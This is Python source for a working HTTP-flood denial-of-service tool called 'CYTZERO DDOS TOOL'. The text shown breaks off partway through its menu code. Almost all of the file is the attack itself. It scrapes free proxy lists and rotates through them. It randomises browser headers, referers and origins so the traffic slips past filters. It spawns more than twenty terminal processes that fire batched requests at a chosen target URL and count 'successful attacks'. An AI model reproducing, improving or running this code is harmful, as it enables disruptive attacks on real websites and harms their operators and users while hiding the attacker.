import sys
import requests
import asyncio
import aiohttp
import random
from bs4 import BeautifulSoup
from datetime import datetime
import time
import os
import subprocess
import atexit
import signal
import json
import psutil  # Add this import for better process management
from colorama import init, Fore, Back, Style

# Initialize colorama for Windows compatibility
init()

# ASCII Art
ASCII_ART = """
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣠⣦⣤⣴⣤⣤⣄⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⣀⣀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣛⣛⣻⣿⣦⣀⠀⢀⣀⣀⣏⣹⠀
⢠⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠭⠭⠽⠽⠿⠿⠭⠭⠭⠽⠿⠿⠛
⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠉⢻⣿⣿⣿⡟⠏⠉⠉⣿⢿⣿⣿⣿⣇⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠉⠁⠀⠀⠀⢠⣿⣿⣿⠋⠑⠒⠒⠚⠙⠸⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⡿⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                                   
           DDOS ATTACK LAYER 7 | V 9.9.9
        
       DEVELOPER : FRMDAO | CYTZERO TEAM                                                  
                                                                                                       
                                                                              
                                                                                                                                                                          
"""

# Basic Configuration
DEFAULT_REQUESTS = 1000
BATCH_SIZE_NO_PROXY = 250
BATCH_SIZE_WITH_PROXY = 1000
TOTAL_TERMINALS = 21
PROCESS_FILE = "attack_processes.json"
USER_AGENTS = [
    # Windows Browsers
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Vivaldi/6.4.3160.47",
    
    # macOS Browsers
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    
    # Linux Browsers
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    
    # Mobile Browsers - iOS
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    
    # Mobile Browsers - Android
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    
    # Gaming Consoles
    "Mozilla/5.0 (PlayStation 5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
    "Mozilla/5.0 (Nintendo Switch; ShareApplet) AppleWebKit/601.6 (KHTML, like Gecko) NF/4.0.0.5.10 NintendoBrowser/5.1.0.13343",
    
    # Smart TVs
    "Mozilla/5.0 (SMART-TV; LINUX; Tizen 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/7.0 TV Safari/537.36",
    "Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.5735.0 Safari/537.36",
    
    # Tablets
    "Mozilla/5.0 (Linux; Android 14; Tab S9 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.119 Mobile/15E148 Safari/604.1"
]

# Enhanced Headers Configuration
ACCEPT_ENCODINGS = [
    'gzip, deflate, br',
    'gzip, deflate',
    'br;q=1.0, gzip;q=0.8, *;q=0.1',
    '*/*',
    'gzip',
    'br'
]

ACCEPT_LANGUAGES = [
    'en-US,en;q=0.9',
    'en-GB,en;q=0.9',
    'en;q=0.9',
    'fr-FR,fr;q=0.9',
    'de-DE,de;q=0.9',
    'es-ES,es;q=0.9',
    'zh-CN,zh;q=0.9',
    '*'
]

CONTENT_TYPES = [
    'application/json',
    'application/x-www-form-urlencoded',
    'multipart/form-data',
    'text/html',
    'application/xml',
    '*/*'
]

POPULAR_DOMAINS = [
    'google.com',
    'facebook.com',
    'twitter.com',
    'instagram.com',
    'youtube.com',
    'amazon.com',
    'netflix.com',
    'microsoft.com',
    'apple.com',
    'linkedin.com'
]

# Proxy Sources List
PROXY_SOURCES = [
    "https://www.us-proxy.org",
    "https://www.socks-proxy.net",
    "https://proxyscrape.com/free-proxy-list",
    "https://www.proxynova.com/proxy-server-list/",
    "https://proxybros.com/free-proxy-list/",
    "https://proxydb.net/",
    "https://spys.one/en/free-proxy-list/",
    "https://hasdata.com/free-proxy-list",
    "https://www.proxyrack.com/free-proxy-list/",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/SoliSpirit/proxy-list/main/socks5.txt"  # Added GitHub source
]

# Add new constant for proxy sharing file
PROXY_SHARE_FILE = "proxy_share.json"

# Add new constant for proxy rotation interval
PROXY_ROTATION_INTERVAL = 50  # Rotate proxies every 50 requests

# Add new constants for monitoring
MONITOR_FILE = "monitor_data.json"
MONITOR_TARGET_FILE = "target_info.txt"  # New file to store target info
MONITOR_UPDATE_INTERVAL = 1  # Update interval in seconds

# Function to fetch proxies from online sources
async def fetch_proxies(source):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(source) as response:
                if response.status == 200:
                    html = await response.text()
                    
                    # Handle GitHub raw proxy list
                    if "githubusercontent.com" in source:
                        proxies = []
                        for line in html.strip().split('\n'):
                            line = line.strip()
                            if line and ':' in line:  # Valid proxy format check
                                proxies.append(f"socks5://{line}")  # Use SOCKS5 protocol
                        return proxies
                        
                    # Handle other sources as before
                    if "us-proxy.org" in source or "socks-proxy.net" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'id': 'proxylisttable'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "proxyscrape.com" in source:
                        proxies = html.strip().split('\r\n')
                        return ["http://" + proxy for proxy in proxies]
                    elif "proxynova.com" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'id': 'tbl_proxy_list'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "proxybros.com" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'class': 'table'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "proxydb.net" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'class': 'table table-sm'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "spys.one" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'class': 'spy1xx'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "freeproxy.world" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'class': 'table table-striped table-bordered'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "hasdata.com" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'class': 'proxies'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "proxyrack.com" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'class': 'table table-striped'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "api.proxyscrape.com" in source:
                         proxies = html.strip().split('\r\n')
                         return proxies
                    else:
                        print(f"Cannot process proxy source: {source}")
                        return []
                else:
                    print(f"Failed to fetch proxies from {source}. Status code: {response.status}")
                    return []
    except Exception as e:
        print(f"Error fetching proxies from {source}: {e}")
        return []

# Function to collect proxies from all sources
async def get_all_proxies():
    all_proxies = []
    for source in PROXY_SOURCES:
        proxies = await fetch_proxies(source)
        if proxies:
            all_proxies.extend(proxies)
            print(f"Successfully fetched {len(proxies)} proxies from {source}")
        else:
            print(f"Failed to fetch proxies from {source}")
    return all_proxies

# Function to clear screen
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Function to show loading progress (updated for speed)
def show_progress(progress, total=100, length=50):
    percent = (progress / float(total)) * 100
    filled_length = int(length * progress // total)
    bar = f"{Fore.GREEN}█{Style.RESET_ALL}" * filled_length + f"{Fore.WHITE}░{Style.RESET_ALL}" * (length - filled_length)
    print(f'\r{Fore.YELLOW}Progress:{Style.RESET_ALL} [{bar}] {Fore.CYAN}{percent:.1f}%{Style.RESET_ALL}', end='', flush=True)

# Function to generate random headers
def generate_headers(url):
    # Parse the target URL to get domain
    from urllib.parse import urlparse
    parsed_url = urlparse(url)
    target_domain = parsed_url.netloc
    
    # Generate random referrer
    referer = f"https://{random.choice(POPULAR_DOMAINS)}"
    if random.random() < 0.3:  # 30% chance to use same-site referrer
        referer = f"https://{target_domain}/{hex(random.randint(0, 1000000))[2:]}"
    
    # Generate random origin
    origin = f"https://{random.choice(POPULAR_DOMAINS)}"
    if random.random() < 0.4:  # 40% chance to use target as origin
        origin = f"https://{target_domain}"
    
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': random.choice(CONTENT_TYPES),
        'Accept-Language': random.choice(ACCEPT_LANGUAGES),
        'Accept-Encoding': random.choice(ACCEPT_ENCODINGS),
        'Referer': referer,
        'Origin': origin,
        'DNT': '1' if random.random() < 0.5 else '0',
        'Connection': 'keep-alive' if random.random() < 0.7 else 'close',
        'Sec-Fetch-Dest': random.choice(['document', 'empty', '']),
        'Sec-Fetch-Mode': random.choice(['navigate', 'cors', 'no-cors']),
        'Sec-Fetch-Site': random.choice(['same-origin', 'same-site', 'cross-site']),
        'Cache-Control': 'no-cache' if random.random() < 0.3 else 'max-age=0',
        'X-Requested-With': 'XMLHttpRequest' if random.random() < 0.3 else '',
    }
    
    # Randomly add extra headers
    if random.random() < 0.3:
        headers['Upgrade-Insecure-Requests'] = '1'
    if random.random() < 0.2:
        headers['Pragma'] = 'no-cache'
    if random.random() < 0.2:
        headers['If-None-Match'] = f'W/"{hex(random.randint(0, 1000000))[2:]}"'
    
    # Clean up empty headers
    return {k: v for k, v in headers.items() if v}

# Function to perform DDoS attack (optimized)
async def attack(url, session, stealth_mode, proxy=None):
    headers = generate_headers(url)
    try:
        if proxy:
            # Reduced timeout and optimized connection settings for proxies
            timeout = aiohttp.ClientTimeout(total=3, connect=1)
            connector = aiohttp.TCPConnector(limit=None, ttl_dns_cache=300)
            async with aiohttp.ClientSession(timeout=timeout, connector=connector) as proxy_session:
                async with proxy_session.get(url, headers=headers, proxy=proxy) as response:
                    return "Success"
        else:
            async with session.get(url, headers=headers, timeout=5) as response:
                return "Success"
    except:
        return "Failed"

def save_process_info(pid, child_pids):
    try:
        data = {
            "parent_pid": pid,
            "child_pids": child_pids,
            "timestamp": time.time()
        }
        with open(PROCESS_FILE, 'w') as f:
            json.dump(data, f)
    except Exception as e:
        print(f"{Fore.RED}Failed to save process info: {str(e)}{Style.RESET_ALL}")

def kill_process_tree(pid):
    try:
        if os.name == 'nt':  # Windows
            # Kill process tree using taskkill
            subprocess.run(['taskkill', '/F', '/T', '/PID', str(pid)], 
                         stdout=subprocess.DEVNULL, 
                         stderr=subprocess.DEVNULL)
            
            # Additional cleanup using psutil
            try:
                parent = psutil.Process(pid)
                children = parent.children(recursive=True)
                for child in children:
                    child.kill()
                parent.kill()
            except:
                pass
        else:  # Linux/Unix
            parent = psutil.Process(pid)
            children = parent.children(recursive=True)
            for child in children:
                child.kill()
            parent.kill()
    except:
        pass  # Process might already be dead

def cleanup_processes():
    try:
        if os.path.exists(PROCESS_FILE):
            with open(PROCESS_FILE, 'r') as f:
                data = json.load(f)
            
            # Kill all child processes
            for pid in data.get("child_pids", []):
                kill_process_tree(pid)
            
            # Kill any python processes that might be related to our script
            if os.name == 'nt':  # Windows
                script_name = os.path.basename(__file__)
                subprocess.run(['taskkill', '/F', '/IM', 'python.exe', '/FI', f'WINDOWTITLE eq *DDOS*'],
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL)
            
            # Remove all temporary files
            os.remove(PROCESS_FILE)
            if os.path.exists(PROXY_SHARE_FILE):
                os.remove(PROXY_SHARE_FILE)
            if os.path.exists(MONITOR_FILE):
                os.remove(MONITOR_FILE)
            if os.path.exists(MONITOR_TARGET_FILE):
                os.remove(MONITOR_TARGET_FILE)
    except Exception as e:
        print(f"{Fore.RED}Failed to cleanup processes: {str(e)}{Style.RESET_ALL}")

def spawn_attack_processes(url, num_requests, stealth_mode):
    script_path = os.path.abspath(__file__)
    child_pids = []
    
    # Save target info for monitor
    try:
        with open(MONITOR_TARGET_FILE, 'w') as f:
            f.write(url)
    except Exception as e:
        pass
    
    # If using proxies, save them to a temporary file for spawned terminals
    if use_proxy and proxies:
        try:
            with open(PROXY_SHARE_FILE, 'w') as f:
                json.dump(proxies, f)
        except Exception as e:
            print(f"{Fore.RED}Failed to save proxy list: {str(e)}{Style.RESET_ALL}")
    
    # Register cleanup function
    atexit.register(cleanup_processes)
    
    # Handle signals gracefully
    def signal_handler(signum, frame):
        print("\nTerminating all processes...")
        cleanup_processes()
        if os.path.exists(PROXY_SHARE_FILE):
            os.remove(PROXY_SHARE_FILE)
        sys.exit(0)
    
    signal.signal(signal.SIGTERM, signal_handler)
    signal.signal(signal.SIGINT, signal_handler)
    
    # Create command with exact same settings including proxy settings
    base_cmd = f'python "{script_path}" --spawn-instance "{url}" {num_requests} {1 if stealth_mode else 0} {1 if use_proxy else 0}'
    
    print(f"{Fore.CYAN}Launching attack terminals...{Style.RESET_ALL}")
    
    # Spawn all attack terminals first
    for i in range(TOTAL_TERMINALS - 1):  # -1 because current terminal counts as one
        try:
            if os.name == 'nt':  # Windows
                # Using 'start' command to create visible windows with specific title and run command
                cmd = f'start cmd /k "title DDOS Terminal {i+1}/{TOTAL_TERMINALS-1} && {base_cmd}"'
                process = subprocess.Popen(
                    cmd,
                    shell=True,
                    creationflags=subprocess.CREATE_NEW_PROCESS_GROUP
                )
                child_pids.append(process.pid)
                
                # Get the actual CMD window process
                time.sleep(0.2)  # Wait for the window to be created
                for proc in psutil.process_iter(['pid', 'name', 'window_title']):
                    try:
                        if proc.info['window_title'] and "DDOS Terminal" in proc.info['window_title']:
                            if proc.pid not in child_pids:
                                child_pids.append(proc.pid)
                    except:
                        continue
            else:  # Linux/Unix
                process = subprocess.Popen(
                    ['gnome-terminal', '--', 'python', script_path, '--spawn-instance', url, str(num_requests), str(1 if stealth_mode else 0), str(1 if use_proxy else 0)],
                    preexec_fn=os.setsid
                )
                child_pids.append(process.pid)
        except Exception as e:
            print(f"{Fore.RED}Failed to spawn terminal {i+1}: {str(e)}{Style.RESET_ALL}")
        time.sleep(0.1)  # Small delay between spawns to prevent system overload
    
    print(f"{Fore.GREEN}Spawned {TOTAL_TERMINALS-1} attack terminals{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Waiting 5 seconds before launching monitor...{Style.RESET_ALL}")
    
    # Wait 5 seconds before launching monitor
    time.sleep(5)
    
    # Create monitor terminal last
    try:
        if os.name == 'nt':  # Windows
            monitor_cmd = f'start cmd /k "title DDOS Monitor && python "{script_path}" --monitor"'
            monitor_process = subprocess.Popen(monitor_cmd, shell=True)
            child_pids.append(monitor_process.pid)
        else:  # Linux/Unix
            monitor_process = subprocess.Popen(['gnome-terminal', '--', 'python', script_path, '--monitor'])
            child_pids.append(monitor_process.pid)
        print(f"{Fore.GREEN}Monitor terminal launched{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Failed to launch monitor: {str(e)}{Style.RESET_ALL}")
    
    # Save process information
    save_process_info(os.getpid(), child_pids)

# Function to split proxies for each terminal
def get_terminal_proxies(all_proxies, terminal_number, total_terminals):
    if not all_proxies:
        return []
    # Calculate slice size for each terminal
    slice_size = len(all_proxies) // total_terminals
    # Get start and end index for this terminal's proxy slice
    start_idx = terminal_number * slice_size
    end_idx = start_idx + slice_size if terminal_number < total_terminals - 1 else len(all_proxies)
    # Return this terminal's proxy slice
    return all_proxies[start_idx:end_idx]

# Main function to run concurrent attacks (optimized)
async def flood(url, num_requests, stealth_mode, use_proxy, proxies):
    clear_screen()
    print(ASCII_ART)

    print(f"{Fore.RED}Launching attack on {Fore.YELLOW}{url}{Style.RESET_ALL}")
    print(f"{Fore.RED}Requests: {Fore.YELLOW}{num_requests}{Style.RESET_ALL}\n")
    print(f"{Fore.RED}Press Ctrl+C to stop attack{Style.RESET_ALL}\n")

    success_count = 0
    failure_count = 0
    start_time = time.time()
    
    # Determine if this is a spawned terminal
    is_spawned = '--spawn-instance' in sys.argv
    
    # Get terminal number if this is a spawned instance
    terminal_number = 0
    if is_spawned:
        try:
            # Extract terminal number from window title (format: "DDOS Terminal X/Y")
            if os.name == 'nt':
                for proc in psutil.process_iter(['pid', 'name', 'window_title']):
                    if proc.info['window_title'] and "DDOS Terminal" in proc.info['window_title']:
                        terminal_number = int(proc.info['window_title'].split()[2].split('/')[0])
                        break
        except:
            pass
    
    # Split proxies for this terminal if using proxies
    if use_proxy and proxies:
        terminal_proxies = get_terminal_proxies(proxies, terminal_number, TOTAL_TERMINALS)
        if terminal_proxies:
            print(f"{Fore.CYAN}Using {len(terminal_proxies)} unique proxies for this terminal{Style.RESET_ALL}")
            # Optimize connection settings for proxy mode
            connector = aiohttp.TCPConnector(limit=None, ttl_dns_cache=300)
            timeout = aiohttp.ClientTimeout(total=3, connect=1)
            client_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
        else:
            print(f"{Fore.YELLOW}No proxies assigned to this terminal{Style.RESET_ALL}")
            client_session = aiohttp.ClientSession()
    else:
        terminal_proxies = []
        client_session = aiohttp.ClientSession()
    
    # Set batch size based on proxy usage
    current_batch_size = BATCH_SIZE_WITH_PROXY if terminal_proxies else BATCH_SIZE_NO_PROXY
    print(f"{Fore.CYAN}Using batch size: {current_batch_size} {'(with proxies)' if terminal_proxies else '(without proxies)'}{Style.RESET_ALL}\n")

    # Only spawn additional processes if this is the main instance
    if not is_spawned:
        spawn_attack_processes(url, num_requests, stealth_mode)

    try:
        async with client_session as session:
            tasks = []
            for i in range(num_requests):
                # Use terminal's specific proxy subset
                proxy = random.choice(terminal_proxies) if terminal_proxies else None
                task = asyncio.create_task(attack(url, session, stealth_mode, proxy))
                tasks.append(task)

                if len(tasks) >= current_batch_size:
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    success_count += sum(1 for r in results if r == "Success")
                    failure_count += sum(1 for r in results if r != "Success")
                    tasks = []
                    show_progress((i + 1) / num_requests * 100)
                    
                    # Update monitor data
                    stats = {
                        "success": success_count,
                        "failure": failure_count,
                        "progress": (i + 1) / num_requests * 100,
                        "proxy_count": len(terminal_proxies) if terminal_proxies else 0
                    }
                    update_monitor_data(terminal_number, stats)

            if tasks:
                results = await asyncio.gather(*tasks, return_exceptions=True)
                success_count += sum(1 for r in results if r == "Success")
                failure_count += sum(1 for r in results if r != "Success")
                show_progress(100)
                
                # Final monitor data update
                stats = {
                    "success": success_count,
                    "failure": failure_count,
                    "progress": 100,
                    "proxy_count": len(terminal_proxies) if terminal_proxies else 0
                }
                update_monitor_data(terminal_number, stats)

    except KeyboardInterrupt:
        if not is_spawned:  # Only parent process should cleanup
            kill_all_terminals()  # Silent kill
            print(f"\n\n{Fore.RED}Attack stopped.{Style.RESET_ALL}")
        return

    except Exception as e:
        if not is_spawned:
            kill_all_terminals()  # Silent kill
        raise

    end_time = time.time()
    elapsed_time = end_time - start_time

    print(f"\n\n{Fore.RED}═══════ 💣 Attack Report 💣 ═══════{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Target URL:{Style.RESET_ALL} {url}")
    print(f"{Fore.YELLOW}Total Requests:{Style.RESET_ALL} {num_requests}")
    print(f"{Fore.GREEN}Successful Attacks:{Style.RESET_ALL} {success_count}")
    print(f"{Fore.RED}Failed Attacks:{Style.RESET_ALL} {failure_count}")
    print(f"{Fore.BLUE}Time Elapsed:{Style.RESET_ALL} {elapsed_time:.2f} seconds")
    if terminal_proxies:
        print(f"{Fore.CYAN}Proxies Used:{Style.RESET_ALL} {len(terminal_proxies)}")
    print(f"{Fore.RED}═══════════════════════════════════{Style.RESET_ALL}")

def load_proxies_from_file():
    try:
        # Get the current working directory and full path
        current_dir = os.getcwd()
        file_path = os.path.join(current_dir, 'sock5.txt')
        
        print(f"{Fore.YELLOW}Current directory: {current_dir}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Looking for file at: {file_path}{Style.RESET_ALL}")
        
        if not os.path.exists(file_path):
            print(f"{Fore.RED}File not found at expected location{Style.RESET_ALL}")
            # Try looking in the script's directory
            script_dir = os.path.dirname(os.path.abspath(__file__))
            file_path = os.path.join(script_dir, 'sock5.txt')
            print(f"{Fore.YELLOW}Trying script directory: {file_path}{Style.RESET_ALL}")
            
            if not os.path.exists(file_path):
                print(f"{Fore.RED}File not found in script directory either{Style.RESET_ALL}")
                return []

        print(f"{Fore.GREEN}Found sock5.txt at: {file_path}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Attempting to open sock5.txt...{Style.RESET_ALL}")
        
        with open(file_path, 'r', encoding='utf-8') as file:
            content = file.read()
            print(f"{Fore.YELLOW}File size: {len(content)} bytes{Style.RESET_ALL}")
            
            if not content.strip():
                print(f"{Fore.RED}File is empty{Style.RESET_ALL}")
                return []
                
            proxy_list = []
            line_count = 0
            
            for line in content.splitlines():
                line_count += 1
                line = line.strip()
                if not line:  # Skip empty lines
                    continue
                    
                try:
                    # Check if the line contains IP:PORT format directly
                    if ':' in line:
                        # Extract just the IP:PORT if there's a delimiter, otherwise use the whole line
                        proxy = line.split('|')[-1].strip() if '|' in line else line.strip()
                        if all(part.strip() for part in proxy.split(':')):  # Verify both IP and port are non-empty
                            proxy_list.append(f"http://{proxy}")
                            print(f"{Fore.GREEN}Successfully parsed proxy: {proxy}{Style.RESET_ALL}")
                        else:
                            print(f"{Fore.YELLOW}Line {line_count}: Invalid IP:PORT format: {proxy}{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.YELLOW}Line {line_count}: No port number found in: {line}{Style.RESET_ALL}")
                except Exception as e:
                    print(f"{Fore.RED}Error parsing line {line_count}: {line} - {str(e)}{Style.RESET_ALL}")
                    continue
                    
            if not proxy_list:
                print(f"{Fore.RED}No valid proxies found in sock5.txt (processed {line_count} lines){Style.RESET_ALL}")
            else:
                print(f"{Fore.GREEN}Found {len(proxy_list)} valid proxies out of {line_count} lines{Style.RESET_ALL}")
            return proxy_list
            
    except FileNotFoundError:
        print(f"{Fore.RED}Error: sock5.txt not found in any location{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Please make sure sock5.txt is in the same folder as the script{Style.RESET_ALL}")
        return []
    except Exception as e:
        print(f"{Fore.RED}Error reading sock5.txt: {str(e)}{Style.RESET_ALL}")
        return []

# Function to show menu and get user input
def show_menu():
    menu_border = f"{Fore.CYAN}╔══════════════════════════════════════╗{Style.RESET_ALL}"
    menu_title = f"{Fore.CYAN}║{Style.RESET_ALL} {Fore.RED}⚡ CYTZERO DDOS TOOL V9.9.9 ⚡{Style.RESET_ALL}{Fore.CYAN} ║{Style.RESET_ALL}"
    menu_border_bottom = f"{Fore.CYAN}╚══════════════════════════════════════╝{Style.RESET_ALL}"
    
    print("\n" + menu_border)
    print(menu_title)
    print(menu_border_bottom)
    
    options = [
        (f"{Fore.GREEN}[1]{Style.RESET_ALL}", f"{Fore.WHITE}Set Target URL{Style.RESET_ALL}"),
        (f"{Fore.GREEN}[2]{Style.RESET_ALL}", f"{Fore.WHITE}Set Threads{Style.RESET_ALL} {Fore.YELLOW}(Default: {DEFAULT_REQUESTS}){Style.RESET_ALL}"),
        (f"{Fore.GREEN}[3]{Style.RESET_ALL}", f"{Fore.WHITE}Stealth Mode{Style.RESET_ALL} {Fore.YELLOW}({Fore.GREEN if stealth_mode else Fore.RED}{'Active' if stealth_mode else 'Inactive'}{Style.RESET_ALL}{Fore.YELLOW}){Style.RESET_ALL}"),
